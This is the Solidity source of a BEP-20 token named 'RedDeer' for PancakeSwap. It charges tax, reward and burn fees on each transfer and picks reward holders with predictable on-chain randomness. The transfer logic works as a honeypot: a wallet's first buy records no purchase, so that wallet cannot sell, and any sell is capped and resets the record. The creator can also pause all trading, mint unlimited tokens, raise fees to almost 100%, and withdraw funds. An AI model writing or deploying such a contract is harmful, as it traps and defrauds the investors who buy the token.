pragma solidity ^0.8.6;


library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


library EnumerableSet {
    struct Set {
        
        bytes32[] _values;
        
        mapping(bytes32 => uint256) _indexes;
    }

    
    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    
    function _remove(Set storage set, bytes32 value) private returns (bool) {
        
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) {
            
            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;

            if (lastIndex != toDeleteIndex) {
                bytes32 lastvalue = set._values[lastIndex];

                
                set._values[toDeleteIndex] = lastvalue;
                
                set._indexes[lastvalue] = valueIndex; 
            }

            
            set._values.pop();

            
            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }

    
    function _contains(Set storage set, bytes32 value)
        private
        view
        returns (bool)
    {
        return set._indexes[value] != 0;
    }

    
    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

    
    function _at(Set storage set, uint256 index)
        private
        view
        returns (bytes32)
    {
        return set._values[index];
    }

    

    struct AddressSet {
        Set _inner;
    }

    
    function add(AddressSet storage set, address value)
        internal
        returns (bool)
    {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    
    function remove(AddressSet storage set, address value)
        internal
        returns (bool)
    {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    
    function contains(AddressSet storage set, address value)
        internal
        view
        returns (bool)
    {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    
    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    
    
    function at(AddressSet storage set, uint256 index)
        internal
        view
        returns (address)
    {
        return address(uint160(uint256(_at(set._inner, index))));
    }
}


library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 amount
    );

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IPancakeFactory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

contract RedDeer is IERC20 {
    using SafeMath for uint256;
    using Address for address;

    
    using EnumerableSet for EnumerableSet.AddressSet;
    
    EnumerableSet.AddressSet private holders;

    /****************************************ERC20 Start*********************************************/

    address public creator; 

    uint256 private _taxRate = 2; 
    uint256 private _rewardRate = 3; 
    uint256 private _burnRate = 5; 

    address private taxTo = 0xD13937de36e80E0eDeDF2b8947FF8E912D04D286; 
    address private burnTo = address(0); 

    uint256 private constant _awardMaxCount = 5; 
    mapping(address => uint256) private awardCounts; 

    uint256 public drawMin = 1 * 10**3 * 10**8 * 10**18; 
    uint256 public drawMax = 3 * 10**6 * 10**8 * 10**18; 
    uint256 public awardMin = 1 * 10**3 * 10**8 * 10**18; 
    uint256 public awardMax = 3 * 10**6 * 10**8 * 10**18; 

    uint256 private _maxHoldRate = 5; 

    address private constant _buyUnlimitFrom =
        0xB7f494F8a0C78f546894f061098Ad1d739Bd3B79; 
    bool private _buyLimited = true; 
    mapping(address => uint256) private lastBuys; 
    uint256 private _buyBeforeSellRate = 20; 

    
    address internal constant FACTORY_V2_ADDRESS =
        0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address internal constant ROUTER_V2_ADDRESS =
        0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function getPair() public view returns (address) {
        address pairAddress = IPancakeFactory(FACTORY_V2_ADDRESS).getPair(
            address(WBNB),
            address(this)
        );
        return pairAddress;
    }

    
    
    
    
    
    

    
    
    
    
    
    
    

    bool private paused = false; 
    bool private increased = false; 

    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    string public override name;
    string public override symbol;
    uint256 public override decimals;
    uint256 public override totalSupply;

    constructor() {
        creator = msg.sender; 

        
        name = "RedDeer"; 
        symbol = "RedDeer"; 
        decimals = 18; 
        totalSupply = 1 * 10**7 * 10**8 * 10**18; 

        
        balanceOf[creator] = totalSupply;
        emit Transfer(address(0), creator, totalSupply);

        
        
        
        
        
    }

    
    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    
    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            allowance[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds _allowances"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(paused == false, "ERC20: token transfer while paused");

        require(
            sender != address(0),
            "ERC20: transfer sender the zero address"
        );
        require(
            recipient != address(0),
            "ERC20: transfer recipient the zero address"
        );
        require(amount > 0, "amount error");

        
        if (
            sender == getPair() &&
            recipient != creator &&
            recipient != ROUTER_V2_ADDRESS
        ) {
            
            if (_buyLimited) {
                require(
                    balanceOf[recipient] + amount <=
                        totalSupply.mul(_maxHoldRate).div(1000),
                    "The buying direction has been restricted"
                );
                
                if (recipient == _buyUnlimitFrom) {
                    _buyLimited = false;
                }
            }
            
            lastBuys[recipient] = balanceOf[recipient] > 0 ? amount : 0;
        }

        
        if (
            recipient == getPair() &&
            sender != creator &&
            sender != ROUTER_V2_ADDRESS
        ) {
            require(lastBuys[sender] > 0, "lastBuy error");
            
            uint256 maxSell1 = balanceOf[sender] - lastBuys[sender];
            require(
                amount <= maxSell1,
                "Exceeding the maximum available for sale"
            );
            
            uint256 maxSell2 = (lastBuys[sender] * 100) / _buyBeforeSellRate;
            require(
                amount <= maxSell2,
                "Exceeding the maximum available for sale"
            );
            
            lastBuys[sender] = 0;
        }

        balanceOf[sender] = balanceOf[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );

        
        uint256 tax = amount.mul(_taxRate).div(100);
        uint256 reward = amount.mul(_rewardRate).div(100);
        uint256 burn = amount.mul(_burnRate).div(100);
        uint256 recipientAmount = amount - burn - reward - tax;

        
        balanceOf[recipient] = balanceOf[recipient].add(recipientAmount);
        emit Transfer(sender, recipient, recipientAmount);

        
        balanceOf[taxTo] = balanceOf[taxTo].add(tax);
        emit Transfer(sender, taxTo, tax);

        
        address rewardAddress = getRewarder(sender, block.timestamp, amount); 
        balanceOf[rewardAddress] = balanceOf[rewardAddress].add(reward);
        emit Transfer(sender, rewardAddress, reward);

        
        balanceOf[burnTo] = balanceOf[burnTo].add(burn);
        emit Transfer(sender, burnTo, burn);

        
        addHolder(sender);
        addHolder(recipient);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve owner the zero address");
        require(
            spender != address(0),
            "ERC20: approve spender the zero address"
        );

        allowance[owner][spender] = amount;

        emit Approval(owner, spender, amount);
    }

    
    
    function additional(address account, uint256 amount)
        public
        onlyCreator
        returns (bool)
    {
        require(increased, "not allowed");
        totalSupply = totalSupply.add(amount);
        balanceOf[account] = balanceOf[account].add(amount);
        emit Transfer(burnTo, account, amount);
        return true;
    }

    /****************************************ERC20 End*********************************************/

    /****************************************Pause Start*********************************************/
    modifier onlyCreator() {
        require(msg.sender == creator, "only Creator");
        _;
    }

    
    function increase(bool _increased) public onlyCreator {
        require(increased != _increased);
        increased = _increased;
    }

    
    function pause() public onlyCreator {
        require(paused == false);
        paused = true;
    }

    
    function unpause() public onlyCreator {
        require(paused == true);
        paused = false;
    }

    
    function changeCreator(address new_creator) public onlyCreator {
        require(creator != new_creator);
        creator = new_creator;
    }

    /****************************************Pause End*********************************************/

    /****************************************Distribute Start*********************************************/

    
    function setDrawCondition(uint256 min, uint256 max) external onlyCreator {
        require(min > 0, "setDrawCondition min the zero");
        require(max > 0, "setDrawCondition max the zero");
        drawMin = min;
        drawMax = max;
    }

    
    function setAwardCondition(uint256 min, uint256 max) external onlyCreator {
        require(min > 0, "setAwardCondition min the zero");
        require(max > 0, "setAwardCondition max the zero");
        awardMin = min;
        awardMax = max;
    }

    
    function getRewarder(
        address seedSender,
        uint256 seedTimestamp,
        uint256 amount
    ) private returns (address) {
        
        if ((amount >= drawMin && amount <= drawMax) == false) {
            return taxTo;
        }

        
        uint256 length = holders.length();
        
        if (length == 0) {
            return taxTo;
        }
        uint256 number = uint256(
            keccak256(abi.encodePacked(seedSender, seedTimestamp, amount))
        );
        uint256 index = number % length;
        address account = holders.at(index);

        
        if (awardCounts[account] >= _awardMaxCount) {
            return taxTo;
        }

        
        uint256 balance = balanceOf[account];
        if ((balance >= awardMin && balance <= awardMax) == false) {
            return taxTo;
        }

        
        awardCounts[account] += 1;
        return account;
    }

    
    function setRate(
        uint256 taxRate,
        uint256 rewardRate,
        uint256 burnRate
    ) public onlyCreator returns (bool) {
        require(taxRate > 0 && taxRate < 100, "must be between 0 and 100");
        require(
            rewardRate > 0 && rewardRate < 100,
            "must be between 0 and 100"
        );
        require(burnRate > 0 && burnRate < 100, "must be between 0 and 100");
        require(
            taxRate + rewardRate + burnRate < 100,
            "The sum of taxRate, rewardFee and burnRate is less than 100"
        );
        _taxRate = taxRate;
        _rewardRate = rewardRate;
        _burnRate = burnRate;
        return true;
    }

    
    function setTaxTo(address value) public onlyCreator returns (bool) {
        require(taxTo != value);
        taxTo = value;
        return true;
    }

    
    function setBuyLimit(bool buyLimited, uint256 maxHoldRate)
        public
        onlyCreator
        returns (bool)
    {
        require(_buyLimited != buyLimited);
        require(maxHoldRate > 0);
        _buyLimited = buyLimited;
        _maxHoldRate = maxHoldRate;
        return true;
    }

    
    function setBuyBeforeSellRate(uint256 buyBeforeSellRate)
        public
        onlyCreator
        returns (bool)
    {
        require(buyBeforeSellRate > 0);
        require(_buyBeforeSellRate != buyBeforeSellRate);
        _buyBeforeSellRate = buyBeforeSellRate;
        return true;
    }

    
    function withdrawal(address token, uint256 amount)
        public
        onlyCreator
        returns (bool)
    {
        return IERC20(token).transfer(creator, amount);
    }

    
    function withdrawal(uint256 amount) public onlyCreator returns (bool) {
        require(amount > 0, "amount error");
        require(
            payable(address(this)).balance >= amount,
            "amount exceeds balance"
        );
        payable(creator).transfer(amount);
        return true;
    }

    /****************************************Distribute End*********************************************/

    
    
    
    function addHolder(address account) private {
        if (
            account.isContract() == false &&
            account != creator &&
            account != taxTo
        ) {
            
            if (balanceOf[account] > 0) {
                holders.add(account);
            } else {
                holders.remove(account);
            }
        }
    }

    function getHolderCount() public view returns (uint256) {
        return holders.length();
    }

    function getHolderAtIndex(uint256 index) public view returns (address) {
        return holders.at(index);
    }
}